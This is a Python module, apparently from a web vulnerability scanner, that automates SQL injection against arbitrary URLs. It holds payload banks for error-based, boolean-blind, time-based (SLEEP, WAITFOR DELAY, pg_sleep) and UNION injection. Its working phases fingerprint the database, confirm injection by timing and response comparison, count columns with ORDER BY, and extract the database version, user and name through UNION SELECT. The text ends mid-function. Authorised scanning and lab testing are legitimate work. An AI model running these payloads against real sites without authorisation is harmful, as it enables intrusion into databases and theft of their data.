# sqli_part.py — SQL Injection phases & helpers (Refactored + Verified Engine)

import re
import time
import difflib
import statistics
from dataclasses import dataclass
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from copy import deepcopy


# ============================================================
# 0) Core Patterns + Helpers (Error detection + DBMS fingerprint)
# ============================================================

# Consolidated DB error signatures (better DBMS detection)
DB_ERROR_SIGNATURES = {
    "sqlite": [
        r"sqlite3\.", r"SQLiteException", r"SQL logic error", r"no such table",
        r"near \".+?\": syntax error", r"sqlite error", r"SQLite\/JDBCDriver",
    ],
    "mysql": [
        r"you have an error in your sql syntax",
        r"mysql server version for the right syntax",
        r"warning:\s*mysql_?",
        r"mysqli?_",
        r"pdo_mysql",
        r"mariaDB server version for the right syntax",  # sometimes appears in mysql-like stacks
    ],
    "mariadb": [
        r"mariadb server version for the right syntax",
        r"mariadb",
    ],
    "mssql": [
        r"unclosed quotation mark after the character string",
        r"microsoft sql server",
        r"sql server native client",
        r"odbc sql server driver",
        r"\[sql server\]",
        r"microsoft ole db provider for sql server",
        r"incorrect syntax near",
    ],
    "postgresql": [
        r"pg::syntaxerror",
        r"psql:\s*error",
        r"org\.postgresql",
        r"postgresql.*error",
        r"error:\s+syntax error at or near",
        r"pg_query\(",
        r"pg_exec\(",
    ],
    "oracle": [
        r"ora-\d{5}",
        r"oracle error",
        r"oracle database",
        r"quoted string not properly terminated",
    ],
}

# General SQL error regex (fast check)
_SQL_ERR_PATTERNS_FLAT = []
for _db, _pats in DB_ERROR_SIGNATURES.items():
    _SQL_ERR_PATTERNS_FLAT.extend(_pats)
SQL_ERR_RE = re.compile("|".join(_SQL_ERR_PATTERNS_FLAT), re.IGNORECASE)


def is_sql_error(text: str) -> bool:
    return bool(text and SQL_ERR_RE.search(text))


def detect_dbms_from_body(text: str):
    """Best-effort DBMS detection from response body."""
    if not text:
        return None
    body = text.lower()
    # Prefer specific over generic
    for dbms, patterns in DB_ERROR_SIGNATURES.items():
        for p in patterns:
            try:
                if re.search(p, body, re.IGNORECASE):
                    return dbms
            except re.error:
                continue
    return None


def _looks_numeric_simple(v):
    try:
        float(v)
        return True
    except Exception:
        return False


def _pick_db_key_from_fingerprint(fp):
    """
    Keeps your old behavior but supports sqlite too.
    Expects fp dict like {"database": "..."}.
    """
    db = (fp or {}).get("database") or ""
    db = (db or "").lower()
    if "sqlite" in db:
        return "sqlite"
    if "mysql" in db or "maria" in db:
        return "mysql"
    if "postgres" in db:
        return "postgresql"
    if "mssql" in db or "sql server" in db:
        return "mssql"
    if "oracle" in db:
        return "oracle"
    return "generic"


# ============================================================
# 1) Payload banks (kept for compatibility)
# ============================================================

# Default SQL payloads (basic probes - mostly used by scanner heuristics if any)
SQL_PAYLOADS = [
    "'", "\"",
    "' OR '1'='1", "\" OR \"1\"=\"1",
    "1 OR 1=1--", "1 OR 1=1#",
    "' OR 1=1-- ", "') OR ('1'='1",
    "';-- ", "'; -- ",
]

# Active DB fingerprint payloads (error-provocation only)
ACTIVE_FP_PAYLOADS = [
    "'\")))))",
    "' AND 1=CONVERT(INT,@@version)--",
    "'; SELECT pg_sleep(0); --",
    "'||(SELECT 1/0)||'",
    "'", "\"", "')", "'))", "`", "'--", "\"--",
]

# Time-based SQLi payloads (DB keyed)
# NOTE: sqlite doesn't have native sleep in typical setups; prefer error/boolean/union there.
TIME_SQLI_PAYLOADS = {
    "mysql": [
        "' OR SLEEP({delay})-- -",
        "\" OR SLEEP({delay})-- -",
        "1) OR SLEEP({delay})-- -",
        "' AND SLEEP({delay})-- -",
    ],
    "mssql": [
        "'; WAITFOR DELAY '0:0:{delay}'--",
        "\"; WAITFOR DELAY '0:0:{delay}'--",
    ],
    "postgresql": [
        "'; SELECT pg_sleep({delay});--",
        "\"; SELECT pg_sleep({delay});--",
        "' AND (SELECT pg_sleep({delay})) IS NULL--",
    ],
    "generic": [
        "' AND IF(1=1,SLEEP({delay}),0)-- -"
    ]
}

# UNION expressions (kept, but scanner should treat as "proof markers" in your lab)
DB_UNION_EXPRS = {
    "mysql": {
        "version": "CONCAT('SCNVER:',@@version,':ENDSCN')",
        "user":    "CONCAT('SCNUSER:',USER(),':ENDSCN')",
        "db":      "CONCAT('SCNDB:',DATABASE(),':ENDSCN')",
    },
    "postgresql": {
        "version": "('SCNVER:' || version() || ':ENDSCN')",
        "user":    "('SCNUSER:' || current_user || ':ENDSCN')",
        "db":      "('SCNDB:' || current_database() || ':ENDSCN')",
    },
    "mssql": {
        "version": "('SCNVER:' + CAST(@@version AS NVARCHAR(4000)) + ':ENDSCN')",
        "user":    "('SCNUSER:' + SYSTEM_USER + ':ENDSCN')",
        "db":      "('SCNDB:' + DB_NAME() + ':ENDSCN')",
    },
}


# ============================================================
# 2) Phase 6 — Verification Engine (stability + similarity)
# ============================================================

def _collect_attempts(send_func, normalize_response, attempts=3, sleep_between=0.0):
    results = []
    for _ in range(max(1, int(attempts))):
        r = send_func()
        if not r:
            continue
        raw = r.text or ""
        norm = normalize_response(raw) if normalize_response else raw
        results.append({
            "status": getattr(r, "status_code", None),
            "length": len(norm),
            "has_sql_error": is_sql_error(raw),
            "dbms_hint": detect_dbms_from_body(raw),
            "body_norm": norm
        })
        if sleep_between and sleep_between > 0:
            time.sleep(sleep_between)
    return results


def _avg_pairwise_similarity(bodies):
    bodies = [b for b in bodies if b is not None]
    if len(bodies) < 2:
        return 1.0
    sims = []
    for i in range(len(bodies)):
        for j in range(i + 1, len(bodies)):
            sims.append(difflib.SequenceMatcher(None, bodies[i], bodies[j]).ratio())
    return sum(sims) / len(sims) if sims else 1.0


def _is_consistent(results, max_len_delta=50, require_same_status=True,
                   require_same_sql_error_flag=False, similarity_threshold=0.98):
    if not results or len(results) < 2:
        return False, "not-enough-samples"

    statuses = [r["status"] for r in results]
    lengths = [r["length"] for r in results]
    errflags = [r["has_sql_error"] for r in results]
    bodies = [r["body_norm"] for r in results]

    if require_same_status and len(set(statuses)) != 1:
        return False, f"status-unstable: {statuses}"

    if (max(lengths) - min(lengths)) > max_len_delta:
        return False, f"length-unstable: {min(lengths)}..{max(lengths)} (delta>{max_len_delta})"

    sim = _avg_pairwise_similarity(bodies)
    if sim < similarity_threshold:
        return False, f"body-unstable: avg_similarity={sim:.3f} (<{similarity_threshold})"

    if require_same_sql_error_flag and len(set(errflags)) != 1:
        return False, f"sqlerr-flag-unstable: {errflags}"

    return True, f"consistent: status={statuses[-1]}, len≈{sum(lengths)//len(lengths)}, avg_similarity={sim:.3f}, sqlerr={errflags[-1]}"


def verify_sqli_consistency(send_func, normalize_response, attempts=3,
                            max_len_delta=50, similarity_threshold=0.98,
                            require_same_status=True, require_same_sql_error_flag=False,
                            sleep_between=0.0):
    runs = _collect_attempts(send_func, normalize_response, attempts=attempts, sleep_between=sleep_between)
    ok, evidence = _is_consistent(
        runs,
        max_len_delta=max_len_delta,
        require_same_status=require_same_status,
        require_same_sql_error_flag=require_same_sql_error_flag,
        similarity_threshold=similarity_threshold
    )
    return {"verified": ok, "evidence": evidence, "samples": len(runs), "runs": runs}


# ============================================================
# 2b) Phase 6 — Time-based SQLi Verification (anti-jitter + baseline thresholds)
# ============================================================

def _median(nums):
    nums = sorted([x for x in nums if x is not None])
    if not nums:
        return None
    n = len(nums)
    mid = n // 2
    if n % 2 == 1:
        return nums[mid]
    return (nums[mid - 1] + nums[mid]) / 2.0


def _collect_timing_attempts(send_func, attempts=3, sleep_between=0.0):
    runs = []
    for _ in range(max(1, int(attempts))):
        t0 = time.perf_counter()
        r = send_func()
        if not r:
            continue
        dt = time.perf_counter() - t0
        runs.append({
            "time": dt,
            "status": getattr(r, "status_code", None),
            "length": len(r.text or "")
        })
        if sleep_between and sleep_between > 0:
            time.sleep(sleep_between)
    return runs


def _timing_consistent(runs, max_time_jitter=0.75, require_same_status=True):
    if not runs or len(runs) < 2:
        return False, "not-enough-timing-samples"
    times = [x["time"] for x in runs]
    statuses = [x["status"] for x in runs]

    if require_same_status and len(set(statuses)) != 1:
        return False, f"status-unstable: {statuses}"

    jitter = (max(times) - min(times)) if times else 999.0
    if jitter > max_time_jitter:
        return False, f"timing-unstable: jitter={jitter:.3f}s (>{max_time_jitter:.3f}s)"

    med = _median(times)
    return True, f"timing-consistent: median={med:.3f}s, jitter={jitter:.3f}s, status={statuses[-1]}"


def _dynamic_time_threshold(base_times, minimum_extra=1.6, sigma=4.0):
    """
    Dynamic threshold: mean + max(minimum_extra, sigma*stdev)
    Returns extra seconds required above baseline median/mean.
    """
    times = [t for t in (base_times or []) if t is not None]
    if not times:
        return minimum_extra
    mean = statistics.mean(times)
    stdev = statistics.pstdev(times) if len(times) > 1 else 0.0
    # We return a delta threshold relative to mean to compare with injected median
    return max(minimum_extra, sigma * stdev)


def verify_time_based_sqli(send_baseline, send_injected, attempts=3,
                           time_threshold=4.0,
                           max_baseline_jitter=0.75,
                           max_injected_jitter=1.00,
                           require_same_status=True,
                           sleep_between=0.0,
                           use_dynamic_threshold=True,
                           dynamic_min_extra=1.6,
                           dynamic_sigma=4.0):
    """
    Confirms time-based only if:
      - baseline timings stable
      - injected timings stable
      - median(injected) >= median(baseline) + threshold
    threshold = max(time_threshold, dynamic(mean+sigma*stdev)) if enabled
    """
    base_runs = _collect_timing_attempts(send_baseline, attempts=attempts, sleep_between=sleep_between)
    inj_runs = _collect_timing_attempts(send_injected, attempts=attempts, sleep_between=sleep_between)

    base_ok, base_ev = _timing_consistent(base_runs, max_time_jitter=max_baseline_jitter, require_same_status=require_same_status)
    inj_ok, inj_ev = _timing_consistent(inj_runs, max_time_jitter=max_injected_jitter, require_same_status=require_same_status)

    base_times = [x["time"] for x in base_runs]
    inj_times = [x["time"] for x in inj_runs]

    base_med = _median(base_times) if base_runs else None
    inj_med = _median(inj_times) if inj_runs else None

    if not base_ok or not inj_ok or base_med is None or inj_med is None:
        return {
            "verified": False,
            "evidence": f"phase6-time: baseline[{base_ev}] injected[{inj_ev}]",
            "baseline": {"runs": base_runs, "median": base_med, "ok": base_ok, "evidence": base_ev},
            "injected": {"runs": inj_runs, "median": inj_med, "ok": inj_ok, "evidence": inj_ev},
        }

    thr = float(time_threshold)
    if use_dynamic_threshold:
        dyn = _dynamic_time_threshold(base_times, minimum_extra=dynamic_min_extra, sigma=dynamic_sigma)
        thr = max(thr, float(dyn))

    confirmed = (inj_med >= (base_med + thr))
    evidence = (
        f"phase6-time: baseline[{base_ev}] injected[{inj_ev}] | "
        f"median_delta={(inj_med - base_med):.3f}s (threshold={thr:.3f}s)"
    )
    return {
        "verified": bool(confirmed),
        "evidence": evidence,
        "baseline": {"runs": base_runs, "median": base_med, "ok": base_ok, "evidence": base_ev},
        "injected": {"runs": inj_runs, "median": inj_med, "ok": inj_ok, "evidence": inj_ev},
        "delta": (inj_med - base_med),
        "threshold_used": thr
    }


# ============================================================
# 3) Active DB Fingerprinting (kept but improved)
# ============================================================

def active_db_fingerprint(method, url, params, request_with_timeout, headers=None, verbose=False, log=print):
    evidence = []
    scores = {}

    if not params:
        return None, evidence

    parsed = urlparse(url)

    for pname, values in params.items():
        original = values[0] if values else ""
        for pl in ACTIVE_FP_PAYLOADS:
            new_params = deepcopy(params)
            new_params[pname] = [str(original) + pl]
            q = urlencode({k: v[0] for k, v in new_params.items()}, doseq=False)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q, parsed.fragment))

            r = request_with_timeout(method, test_url, headers=headers)
            if not r:
                continue

            body_raw = (r.text or "")
            body = body_raw.lower()

            dbms = detect_dbms_from_body(body_raw)
            if dbms:
                scores[dbms] = scores.get(dbms, 0) + 2
                evidence.append(f"active-fp: param={pname}, payload={pl!r}, matched-dbms={dbms}")
                continue

            # fallback: check all patterns (light)
            for dbms_k, patterns in DB_ERROR_SIGNATURES.items():
                for p in patterns:
                    try:
                        if re.search(p, body, re.IGNORECASE):
                            scores[dbms_k] = scores.get(dbms_k, 0) + 1
                            evidence.append(f"active-fp: param={pname}, payload={pl!r}, matched /{p}/ for {dbms_k}")
                            break
                    except re.error:
                        continue

    if not scores:
        return None, evidence

    best_db = max(scores, key=scores.get)
    evidence.append(f"active-fp result: best_db={best_db} with score={scores[best_db]}")
    if verbose:
        log(f"[ACTIVE-FP] Active fingerprint scores: {scores}, chosen={best_db}")

    return best_db, evidence


# ============================================================
# 4) Phase 1: Boolean Blind SQLi (Upgraded verification logic inside)
# ============================================================

class BlindBooleanSQLiPhase:
    def __init__(self, request_with_timeout, normalize_response, now_ts, compute_score, log=print,
                 retries=3, length_diff_ratio=0.15, similarity_threshold=0.97):
        self.request_with_timeout = request_with_timeout
        self.normalize_response = normalize_response
        self.now_ts = now_ts
        self.compute_score = compute_score
        self.log = log

        self.retries = max(1, retries)
        self.length_diff_ratio = length_diff_ratio
        self.similarity_threshold = similarity_threshold

    def _send_retriable(self, method, url, headers=None):
        lengths = []
        bodies = []
        statuses = []
        sqlerrs = []
        for _ in range(self.retries):
            r = self.request_with_timeout(method, url, headers=headers)
            if not r:
                continue
            raw = r.text or ""
            body = self.normalize_response(raw) if self.normalize_response else raw
            lengths.append(len(body))
            bodies.append(body)
            statuses.append(r.status_code)
            sqlerrs.append(is_sql_error(raw))
        if not lengths:
            return None, None, None, None
        avg_len = sum(lengths) / len(lengths)
        return avg_len, bodies[-1], statuses[-1], sqlerrs[-1]

    def _looks_numeric(self, value):
        return _looks_numeric_simple(value)

    def _build_injected_value(self, original_value, which):
        original_value = "" if original_value is None else original_value
        if self._looks_numeric(original_value):
            return f"{original_value} AND 1=1" if which == "true" else f"{original_value} AND 1=2"
        # string
        return f"{original_value}' AND '1'='1" if which == "true" else f"{original_value}' AND '1'='2"

    def _similar(self, a, b):
        if a is None or b is None:
            return 0.0
        return difflib.SequenceMatcher(None, a, b).ratio()

    def _significant_length_diff(self, len_a, len_b):
        if len_a is None or len_b is None:
            return False
        bigger = max(len_a, len_b)
        smaller = min(len_a, len_b)
        if bigger == 0:
            return False
        diff_ratio = (bigger - smaller) / bigger
        return diff_ratio >= self.length_diff_ratio

    def run_for_url(self, method, url, headers=None, fingerprint=None):
        method = method.upper()
        if method != "GET":
            return []

        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return []

        base_len, base_body, base_status, base_sqlerr = self._send_retriable(method, url, headers=headers)
        if base_body is None:
            return []

        findings = []
        for param_name, values in params.items():
            original_value = values[0] if values else ""

            true_params = deepcopy(params)
            true_params[param_name] = [self._build_injected_value(original_value, "true")]
            true_qs = urlencode({k: v[0] for k, v in true_params.items()}, doseq=False)
            true_url = urlunparse(parsed._replace(query=true_qs))

            false_params = deepcopy(params)
            false_params[param_name] = [self._build_injected_value(original_value, "false")]
            false_qs = urlencode({k: v[0] for k, v in false_params.items()}, doseq=False)
            false_url = urlunparse(parsed._replace(query=false_qs))

            true_len, true_body, true_status, true_sqlerr = self._send_retriable(method, true_url, headers=headers)
            false_len, false_body, false_status, false_sqlerr = self._send_retriable(method, false_url, headers=headers)

            if true_body is None or false_body is None:
                continue

            sim_base_true = self._similar(base_body, true_body)
            sim_base_false = self._similar(base_body, false_body)
            sim_true_false = self._similar(true_body, false_body)

            is_true_like_base = (
                sim_base_true >= self.similarity_threshold and
                not self._significant_length_diff(base_len, true_len) and
                (true_status == base_status)
            )

            # False must differ meaningfully (body OR len OR status OR sql-error flag)
            is_false_differs = (
                sim_base_false < self.similarity_threshold or
                self._significant_length_diff(base_len, false_len) or
                (false_status != base_status) or
                (true_sqlerr != false_sqlerr) or
                (sim_true_false < self.similarity_threshold) or
                self._significant_length_diff(true_len, false_len)
            )

            if is_true_like_base and is_false_differs:
                score = 40
                finding = {
                    "timestamp": self.now_ts(),
                    "url": url,
                    "test_url": false_url,
                    "method": method,
                    "injected_param": param_name,
                    "payload": "[BOOLEAN_PROBE: AND 1=1 / AND 1=2]",
                    "vuln_type": "Potential Blind SQLi",
                    "phase": "blind",
                    "reason": (
                        "Boolean-based difference: baseline≈true but baseline/false differ. "
                        f"sim_base_true={sim_base_true:.3f}, sim_base_false={sim_base_false:.3f}, sim_true_false={sim_true_false:.3f}, "
                        f"status(base/false)={base_status}/{false_status}, sqlerr(base/false)={base_sqlerr}/{false_sqlerr}"
                    ),
                    "status_code": false_status,
                    "auto_verified": False,
                    "verify": {
                        "verified": False,
                        "evidence": "Phase 1 boolean upgraded heuristic (needs auto_verify_sqli for confirmed)",
                        "score_delta": 0,
                        "elapsed": 0.0
                    },
                    "fingerprint": fingerprint or {},
                    "score": score,
                    "status": "probable",
                    "base_len": int(base_len or 0),
                    "resp_len": int(false_len or 0)
                }
                self.log(f"[BLIND] Potential Blind SQLi on {url} param '{param_name}' (score={score})")
                findings.append(finding)

        return findings


# ============================================================
# 5) Phase 2: Time-based SQLi (Verified + Baseline thresholds)
# ============================================================

def measure_avg_response_time(method, url, request_with_timeout, headers=None, data=None, json_body=None, samples=3):
    times = []
    last_status = None
    last_len = 0
    for _ in range(max(1, samples)):
        t0 = time.perf_counter()
        r = request_with_timeout(method, url, headers=headers, data=data, json_body=json_body)
        if not r:
            continue
        dt = time.perf_counter() - t0
        times.append(dt)
        last_status = r.status_code
        last_len = len(r.text or "")
    if not times:
        return None, None, None
    avg = sum(times) / len(times)
    return avg, last_status, last_len


def run_time_based_sqli_phase(method, url, params, headers, json_body, post_data,
                              fingerprint, time_delay, time_threshold, time_samples,
                              request_with_timeout, compute_score, log, now_ts, verbose=False):
    findings = []
    method = method.upper()
    if not params:
        return findings

    db_key = _pick_db_key_from_fingerprint(fingerprint)
    payload_templates = TIME_SQLI_PAYLOADS.get(db_key, TIME_SQLI_PAYLOADS.get("generic", []))

    def _send_baseline():
        return request_with_timeout(
            method, url,
            headers=headers,
            data=post_data if method == "POST" else None,
            json_body=json_body if method == "POST" and json_body is not None else None
        )

    baseline_avg, base_status, base_len = measure_avg_response_time(
        method, url, request_with_timeout,
        headers=headers,
        data=post_data if method == "POST" else None,
        json_body=json_body if method == "POST" and json_body is not None else None,
        samples=max(1, time_samples)
    )
    if baseline_avg is None:
        return findings

    if verbose:
        log(f"[TIME] Baseline avg for {url}: {baseline_avg:.3f}s (samples={time_samples}) | db_key={db_key}")

    parsed = urlparse(url)

    for param_name, values in params.items():
        original_value = values[0] if values else ""

        for tmpl in payload_templates:
            payload_str = tmpl.format(delay=time_delay)
            injected_value = f"{original_value}{payload_str}"

            new_params = deepcopy(params)
            new_params[param_name] = [injected_value]
            query = urlencode({k: v[0] for k, v in new_params.items()}, doseq=False)
            inj_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))

            def _send_injected():
                return request_with_timeout(
                    method, inj_url,
                    headers=headers,
                    data=post_data if method == "POST" else None,
                    json_body=json_body if method == "POST" and json_body is not None else None
                )

            # VERIFIED time-based using dynamic threshold + control stability
            v = verify_time_based_sqli(
                send_baseline=_send_baseline,
                send_injected=_send_injected,
                attempts=max(3, int(time_samples or 3)),
                time_threshold=float(time_threshold),
                max_baseline_jitter=max(0.75, float(time_threshold) / 3.0),
                max_injected_jitter=max(1.00, float(time_threshold) / 2.0),
                require_same_status=True,
                sleep_between=0.0,
                use_dynamic_threshold=True,
                dynamic_min_extra=1.6,
                dynamic_sigma=4.0
            )

            if verbose:
                bmed = v.get("baseline", {}).get("median")
                imed = v.get("injected", {}).get("median")
                log(f"[TIME] Param '{param_name}' tmpl='{tmpl}': baseline_med={bmed}, inj_med={imed}, verified={v.get('verified')} thr={v.get('threshold_used')}")

            if not v.get("verified"):
                continue

            baseline_med = v["baseline"]["median"]
            injected_med = v["injected"]["median"]
            thr_used = v.get("threshold_used", time_threshold)

            verify_result = {
                "verified": True,
                "evidence": v.get("evidence", "") + f" | baseline_med≈{baseline_med:.2f}s, injected_med≈{injected_med:.2f}s, thr_used≈{thr_used:.2f}s",
                "score_delta": 55,
                "elapsed": injected_med
            }

            score = compute_score(base_confidence=40, fingerprint=fingerprint, verify_result=verify_result, payload=payload_str)
            status_label = "confirmed" if score >= 50 else "probable"

            finding = {
                "timestamp": now_ts(),
                "url": url,
                "test_url": inj_url,
                "method": method,
                "injected_param": param_name,
                "payload": payload_str,
                "vuln_type": "Time-based SQLi",
                "phase": "time",
                "reason": f"median response time increased from {baseline_med:.2f}s to {injected_med:.2f}s (threshold {thr_used:.2f}s)",
                "status_code": v["injected"]["runs"][-1]["status"] if v.get("injected", {}).get("runs") else None,
                "auto_verified": True,
                "verify": verify_result,
                "fingerprint": fingerprint or {},
                "score": score,
                "status": status_label,
                "base_len": int(base_len or 0),
                "resp_len": int(v["injected"]["runs"][-1]["length"]) if v.get("injected", {}).get("runs") else 0,
                "time_verify": {
                    "baseline_runs": v["baseline"]["runs"],
                    "injected_runs": v["injected"]["runs"],
                    "baseline_median": baseline_med,
                    "injected_median": injected_med,
                    "delta": v.get("delta"),
                    "threshold_used": thr_used
                }
            }
            log(f"[VULN] Time-based SQLi on {url} param '{param_name}' payload: {payload_str} (score={score})")
            findings.append(finding)
            break

    return findings


# ============================================================
# 6) UNION Extraction (Phase 3b) — keep but safer verification
# ============================================================

def _build_order_by_value(original_value, n):
    original_value = original_value or ""
    if _looks_numeric_simple(original_value):
        return f"{original_value} ORDER BY {n}-- "
    return f"{original_value}' ORDER BY {n}-- -"


def _build_union_value(original_value, select_list):
    original_value = original_value or ""
    if _looks_numeric_simple(original_value):
        return f"{original_value} UNION ALL SELECT {select_list}-- "
    return f"{original_value}' UNION ALL SELECT {select_list}-- -"


def _make_param_url(base_url, params, param_name, injected_value):
    parsed = urlparse(base_url)
    new_params = deepcopy(params) if params else {}
    new_params[param_name] = [injected_value]
    query = urlencode({k: v[0] for k, v in new_params.items()}, doseq=False)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, parsed.fragment))


def _detect_column_count_order_by(method, url, params, param_name, headers, base_status, base_text_raw,
                                  request_with_timeout, normalize_response, length_change_ratio,
                                  max_cols=12, verbose=False, log=print):
    base_norm = normalize_response(base_text_raw or "")
    for n in range(1, max_cols + 1):
        inj_val = _build_order_by_value(params.get(param_name, ["1"])[0], n)
        test_url = _make_param_url(url, params, param_name, inj_val)
        r = request_with_timeout("GET", test_url, headers=headers)
        if not r:
            if verbose:
                log(f"[UNION] ORDER BY {n} request failed: {test_url}")
            break

        text = r.text or ""
        norm = normalize_response(text)
        len_ratio = length_change_ratio(base_norm, norm)

        # If it triggers server error / SQL error / large delta => likely exceeded col count
        if r.status_code != base_status or len_ratio > 0.40 or is_sql_error(text):
            if n == 1:
                return None
            if verbose:
                log(f"[UNION] Column count for {url} param {param_name} ≈ {n-1}")
            return n - 1
    return None


def _test_union_compatible(url, params, param_name, headers, base_status, base_text_raw,
                           col_count, request_with_timeout, normalize_response, length_change_ratio,
                           verbose=False, log=print):
    # Use NULLs only to avoid side effects.
    nulls = ",".join(["NULL"] * col_count)
    original_value = params.get(param_name, ["1"])[0]
    inj_val = _build_union_value(original_value, nulls)
    test_url = _make_param_url(url, params, param_name, inj_val)

    r = request_with_timeout("GET", test_url, headers=headers)
    if not r:
        return False

    text = r.text or ""
    norm = normalize_response(text)
    base_norm = normalize_response(base_text_raw or "")
    len_ratio = length_change_ratio(base_norm, norm)

    if verbose:
        log(f"[UNION] UNION NULLs test: status={r.status_code}, len_ratio={len_ratio:.2f}, sqlerr={is_sql_error(text)}")

    if r.status_code >= 500 or is_sql_error(text):
        return False

    # Basic "compatibility": not huge deviation
    if len_ratio > 0.70:
        return False

    return True


def _find_reflected_columns_union(url, params, param_name, headers, col_count,
                                 request_with_timeout, verbose=False, log=print):
    markers = [f"UNIONCOL_{i}_SCN" for i in range(1, col_count + 1)]
    select_list = ",".join([f"'{m}'" for m in markers])
    original_value = params.get(param_name, ["1"])[0]
    inj_val = _build_union_value(original_value, select_list)
    test_url = _make_param_url(url, params, param_name, inj_val)

    r = request_with_timeout("GET", test_url, headers=headers)
    if not r:
        return []
    body = r.text or ""
    reflected = [i for i, m in enumerate(markers, start=1) if m in body]
    if verbose:
        log(f"[UNION] Reflected columns: {reflected}")
    return reflected


def _build_union_select_expr(expr, col_count, reflected_idx):
    return ",".join([expr if i == reflected_idx else "NULL" for i in range(1, col_count + 1)])


def _extract_marker_from_body(body, marker_prefix):
    if not body:
        return None
    pattern = re.escape(marker_prefix) + r"(.*?)" + re.escape(":ENDSCN")
    m = re.search(pattern, body, re.DOTALL | re.IGNORECASE)
    return m.group(1).strip() if m else None


def run_union_extraction_phase(method, url, params, headers, fingerprint,
                               base_status, base_text_raw,
                               request_with_timeout, normalize_response, length_change_ratio,
                               compute_score, log, now_ts, verbose=False):
    findings = []
    method = method.upper()
    if method != "GET" or not params:
        return findings

    db_key = _pick_db_key_from_fingerprint(fingerprint)
    union_exprs = DB_UNION_EXPRS.get(db_key)

    # If unknown, default to mysql markers (lab-only usage)
    if not union_exprs:
        union_exprs = DB_UNION_EXPRS.get("mysql")
        db_key = "mysql"

    for param_name, values in params.items():
        if verbose:
            log(f"[UNION] Trying UNION phase on {url} param {param_name}")

        col_count = _detect_column_count_order_by(
            method, url, params, param_name, headers, base_status, base_text_raw,
            request_with_timeout, normalize_response, length_change_ratio,
            max_cols=12, verbose=verbose, log=log
        )
        if not col_count or col_count < 1:
            continue

        if not _test_union_compatible(
            url, params, param_name, headers, base_status, base_text_raw, col_count,
            request_with_timeout, normalize_response, length_change_ratio,
            verbose=verbose, log=log
        ):
            continue

        reflected_cols = _find_reflected_columns_union(
            url, params, param_name, headers, col_count,
            request_with_timeout, verbose=verbose, log=log
        )
        if not reflected_cols:
            continue

        reflected_idx = reflected_cols[0]
        original_value = values[0] if values else ""

        db_info = {"db_type": db_key, "db_version": None, "current_user": None, "current_database": None}
        last_status = base_status
        last_test_url = url

        # Extract markers (this is your lab; keep markers for proof)
        for tag, marker_prefix in [("version", "SCNVER:"), ("user", "SCNUSER:"), ("db", "SCNDB:")]:
            expr = union_exprs.get(tag)
            if not expr:
                continue
            select_list = _build_union_select_expr(expr, col_count, reflected_idx)
            inj_val = _build_union_value(original_value, select_list)
            test_url = _make_param_url(url, params, param_name, inj_val)

            r = request_with_timeout("GET", test_url, headers=headers)
            if not r:
                continue

            body = r.text or ""
            last_status = r.status_code
            last_test_url = test_url

            val = _extract_marker_from_body(body, marker_prefix)
            if verbose:
                log(f"[UNION] Extract {tag}: {val}")

            if tag == "version":
                db_info["db_version"] = val
            elif tag == "user":
                db_info["current_user"] = val
            else:
                db_info["current_database"] = val

        if not (db_info["db_version"] or db_info["current_user"] or db_info["current_database"]):
            continue

        verify_result = {
            "verified": True,
            "evidence": "UNION-based extraction with SCN* markers succeeded",
            "score_delta": 60,
            "elapsed": 0.0
        }
        score = compute_score(base_confidence=50, fingerprint=fingerprint, verify_result=verify_result, payload="[UNION_EXTRACT]")

        finding = {
            "timestamp": now_ts(),
            "url": url,
            "test_url": last_test_url,
            "method": method,
            "injected_param": param_name,
            "payload": "[UNION_EXTRACT]",
            "vuln_type": "SQLi-UNION",
            "phase": "union",
            "reason": (
                f"UNION-based SQLi confirmed; cols={col_count}, reflected={reflected_cols}, "
                f"version={db_info['db_version']}, user={db_info['current_user']}, db={db_info['current_database']}"
            ),
            "status_code": last_status,
            "auto_verified": True,
            "verify": verify_result,
            "fingerprint": fingerprint or {},
            "score": score,
            "status": "confirmed",
            "base_len": 0,
            "resp_len": 0,
            "db_info": db_info,
            "union_meta": {"column_count": col_count, "reflected_columns": reflected_cols}
        }
        log(f"[VULN] SQLi-UNION on {url} param '{param_name}' (score={score})")
        findings.append(finding)

    return findings


# ============================================================
# 7) Auto-verify SQLi (Boolean verified; improved, less heuristic)
# ============================================================

def _build_true_false_payloads(original_value: str):
    """
    Build payloads using original_value context (numeric vs string).
    Safer than fixed "1' OR..." for all cases.
    """
    ov = "" if original_value is None else str(original_value)

    if _looks_numeric_simple(ov):
        # numeric context
        return (f"{ov} AND 1=1", f"{ov} AND 1=2")

    # string context
    # Try to preserve string closing with quote
    return (f"{ov}' AND '1'='1", f"{ov}' AND '1'='2")


def auto_verify_sqli(method, url, param_name, original_params, post_data, headers,
                     request_with_timeout, normalize_response, base_text="",
                     json_body=None, json_key=None,
                     verify_attempts=3,
                     max_len_delta=60,
                     similarity_threshold=0.98,
                     sleep_between=0.0,
                     return_details=False):
    """
    Verified boolean-based check:
      - Ensure true response stable
      - Ensure false response stable
      - Confirm true and false differ (status/length/similarity/sqlerr)
    """
    method_u = (method or "GET").upper()

    # resolve original value
    original_value = ""
    if json_body is not None and json_key is not None:
        original_value = str(json_body.get(json_key, ""))
    else:
        if original_params and param_name in original_params:
            vv = original_params.get(param_name) or [""]
            original_value = vv[0] if vv else ""
        elif post_data and param_name in post_data:
            original_value = str(post_data.get(param_name, ""))
        else:
            original_value = ""

    true_p, false_p = _build_true_false_payloads(original_value)

    def _send_with_value(v):
        if json_body is not None and json_key is not None:
            jb = deepcopy(json_body)
            jb[json_key] = v
            return request_with_timeout(method_u, url, headers=headers, json_body=jb)

        parsed = urlparse(url)
        p_new = deepcopy(original_params) if original_params else {}
        key = param_name if param_name is not None else "_scantest"
        p_new[key] = [v]
        q_new = urlencode({k: val[0] for k, val in p_new.items()}, doseq=False)
        url_new = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, q_new, parsed.fragment))

        if method_u == "POST" and post_data and key in post_data:
            pd = deepcopy(post_data)
            pd[key] = v
            return request_with_timeout("POST", url, data=pd, headers=headers)

        return request_with_timeout("GET" if method_u == "GET" else "POST", url_new, data=post_data, headers=headers)

    def _send_true():
        return _send_with_value(true_p)

    def _send_false():
        return _send_with_value(false_p)

    true_runs = _collect_attempts(_send_true, normalize_response, attempts=verify_attempts, sleep_between=sleep_between)
